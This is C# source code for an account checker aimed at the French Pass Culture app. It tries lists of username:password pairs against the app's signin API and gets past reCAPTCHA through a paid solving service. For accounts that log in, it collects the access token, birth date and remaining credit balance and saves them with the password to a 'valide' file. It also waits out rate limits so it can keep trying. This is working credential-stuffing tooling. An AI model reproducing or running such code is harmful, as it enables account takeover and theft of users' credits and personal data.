using System.Net;
using Newtonsoft.Json;
using Newtonsoft.Json.Linq;
using TwoCaptcha.Captcha;
using TwoCaptcha.Examples;


namespace DataVortex
{
    internal class Checker
    {
        public static double Remaining1 { get; private set; }
        public static string BirthDate { get; private set; }
        
        public static string AccessToken { get; private set; }

        public static string RecaptchaToken { get; private set; }

        private static HashSet<string> foundAccounts = new HashSet<string>();
        private static Dictionary<string, bool> accountVerificationStatus = new Dictionary<string, bool>();

        public static void HandleAccount(string keyword, (string url, string username, string password, string app) account)
        {
            if (IsAccountVerified(account.username, account.password))
            {
                Console.ForegroundColor = ConsoleColor.Magenta;
                Console.WriteLine("Ce compte a déjà été vérifié. Ignoré.");
                Console.ResetColor();
                return;
            }

            switch (keyword)
            {
                case "passculture":
                    CheckPassCultureAsync(account.username, account.password);
                    break;
                    // Ajoutez d'autres cas ici pour gérer d'autres types de comptes
            }
        }

        private static bool IsAccountVerified(string username, string password)
        {
            string key = $"{username}:{password}";
            if (accountVerificationStatus.ContainsKey(key))
            {
                return accountVerificationStatus[key];
            }
            return false;
        }


        public static void MarkAccountAsVerified(string username, string password)
        {
            string key = $"{username}:{password}";
            accountVerificationStatus[key] = true;
        }


        public static async Task CheckPassCultureAsync(string username, string password)
        {
            Console.Write("Captcha en cours");
            Console.WriteLine(" ");
            ReCaptchaV2Example.SolveCaptcha();
            string captchaCode = ReCaptchaV2Example.CaptchaCode;
            var url = "https://backend.passculture.app/native/v1/signin";

            var httpRequest = (HttpWebRequest)WebRequest.Create(url);
            httpRequest.Method = "POST";
            httpRequest.ContentType = "application/json";

            var data = "{\"identifier\":\"" + username + "\",\"password\":\"" + password + "\",\"token\":\"" + captchaCode + "\"}";

            try
            {
                using (var streamWriter = new StreamWriter(httpRequest.GetRequestStream()))
                {
                    streamWriter.Write(data);
                }

                var httpResponse = (HttpWebResponse)httpRequest.GetResponse();
                using (var streamReader = new StreamReader(httpResponse.GetResponseStream()))
                {
                    var result = streamReader.ReadToEnd();
                    var jsonResponse = JObject.Parse(result);

                    // Vérification de l'accountState
                    if (jsonResponse["accountState"] != null)
                    {
                        var accountState = jsonResponse["accountState"].ToString();
                        Console.ForegroundColor = ConsoleColor.Yellow;
                        Console.WriteLine($"accountState: {accountState}");
                        Console.ResetColor();

                        if (accountState == "SUSPICIOUS_LOGIN_REPORTED_BY_USER")
                        {

                            // Ajoutez le nom d'utilisateur incorrect au fichier "incorrect.txt"
                            using (StreamWriter sw = new StreamWriter("incorrect.txt", true))
                                sw.WriteLine($"{username}:{password}");
                            MarkAccountAsVerified(username, password);
                        }
                        if (accountState == "SUSPENDED")
                        {

                            // Ajoutez le nom d'utilisateur incorrect au fichier "incorrect.txt"
                            using (StreamWriter sw = new StreamWriter("incorrect.txt", true))
                                sw.WriteLine($"{username}:{password}");
                            MarkAccountAsVerified(username, password);
                        }
                    }
                    if (jsonResponse.ContainsKey("code") && jsonResponse["code"].ToString() == "EMAIL_NOT_VALIDATED")
                    {
                        // Ajoutez le compte à la liste des incorrect
                        using (StreamWriter sw = new StreamWriter("incorrect.txt", true))
                        {
                            sw.WriteLine($"{username}:{password}");
                            Console.WriteLine("L'email n'a pas été validé. Ajout dans la liste incorrect.");
                            MarkAccountAsVerified(username, password);
                        }

                        // Vous pouvez également gérer d'autres informations spécifiques à "EMAIL_NOT_VALIDATED" ici
                    }


                    if (httpResponse.StatusCode == HttpStatusCode.BadRequest)
                    {
                        Console.ForegroundColor = ConsoleColor.Red;
                        Console.WriteLine("Erreur 400 : Mot de passe incorrect.");
                        Console.ResetColor();

                        // Ajoutez le nom d'utilisateur incorrect au fichier "incorrect.txt"
                        using (StreamWriter sw = new StreamWriter("incorrect.txt", true))
                            sw.WriteLine($"{username}:{password}");
                    }

                    if (jsonResponse["accessToken"] != null && !jsonResponse["accountState"].ToString().Equals("SUSPICIOUS_LOGIN_REPORTED_BY_USER"))
                    {
                        var accessToken = jsonResponse["accessToken"].ToString();
                        Console.ForegroundColor = ConsoleColor.Yellow;
                        Console.WriteLine($"accessToken: {accessToken}");
                        Console.ResetColor();

                        var url3 = "https://backend.passculture.app/native/v1/me";
                            var httpRequest3 = (HttpWebRequest)WebRequest.Create(url3);
                            httpRequest3.Headers["Authorization"] = "Bearer " + accessToken;

                            var httpResponse3 = (HttpWebResponse)httpRequest3.GetResponse();
                            using (var streamReader3 = new StreamReader(httpResponse3.GetResponseStream()))
                            {
                                var result3 = streamReader3.ReadToEnd();
                                var jsonResponse3 = JObject.Parse(result3);

                                if (jsonResponse3["birthDate"] != null)
                                {
                                    BirthDate = jsonResponse3["birthDate"].ToString();
                                    Console.ForegroundColor = ConsoleColor.Yellow;
                                    Console.WriteLine($"birthDate: {BirthDate}");
                                    Console.ResetColor();
                                }

                                if (jsonResponse3["domainsCredit"] != null)
                                {
                                    var domainsCredit = jsonResponse3["domainsCredit"];

                                    if (domainsCredit["all"] != null)
                                    {
                                        var allCredit = domainsCredit["all"];

                                        if (allCredit["remaining"] != null)
                                        {
                                            var remaining = allCredit["remaining"].ToObject<int>();
                                            Remaining1 = (double)remaining / 100.0;
                                            Console.ForegroundColor = ConsoleColor.Yellow;
                                            Console.WriteLine($"Remaining1: {Remaining1}");
                                            Console.ResetColor();
                                        }
                                    }
                                }
                                // Create a JSON object with the relevant details
                                var accountDetails = new
                                {
                                    Username = username,
                                    Password = password,
                                    BirthDate = BirthDate,
                                    Remaining1 = Remaining1,
                                    AccessToken = accessToken
                                };

                                // Serialize the JSON object to a string
                                var jsonDetails = JsonConvert.SerializeObject(accountDetails);

                                // Append the JSON string to the "valide.txt" file
                                using (StreamWriter sw = new StreamWriter("valide.txt", true))
                                {
                                    sw.WriteLine(jsonDetails);
                                }
                            }
                        }
                    }

                // Marquer le compte comme vérifié une fois la vérification réussie
                MarkAccountAsVerified(username, password);
            }
            catch (WebException ex)
            {
                if (ex.Response is HttpWebResponse errorResponse)
                {
                    if (errorResponse.StatusCode == HttpStatusCode.BadRequest)
                    {
                        Console.ForegroundColor = ConsoleColor.Green;
                        Console.WriteLine("Erreur 400 : Mot de passe incorrect.");
                        Console.ResetColor();

                        // Ajoutez le nom d'utilisateur incorrect au fichier "incorrect.txt"
                        using (StreamWriter sw = new StreamWriter("incorrect.txt", true))
                            sw.WriteLine($"{username}:{password}");

                        // Ajouter le compte dans la liste des vérifiés pour ne pas le revérifier plusieurs fois
                        MarkAccountAsVerified(username, password);
                    }
                    else if (errorResponse.StatusCode == (HttpStatusCode)429)
                    {
                        Console.ForegroundColor = ConsoleColor.Red;
                        Console.WriteLine("Erreur 429 : Rate limit atteint. Prochaine tentative dans 5 minute.");
                        Console.ResetColor();
                        Thread.Sleep(300000); // Attendez 5 minute (300000 millisecondes) avant de réessayer.
                        await CheckPassCultureAsync(username, password); // Réessayez après l'attente.
                    }
                }
            }
        }

        public static async Task DelayAsync(int milliseconds)
        {
            await Task.Delay(milliseconds);
        }
    }
}
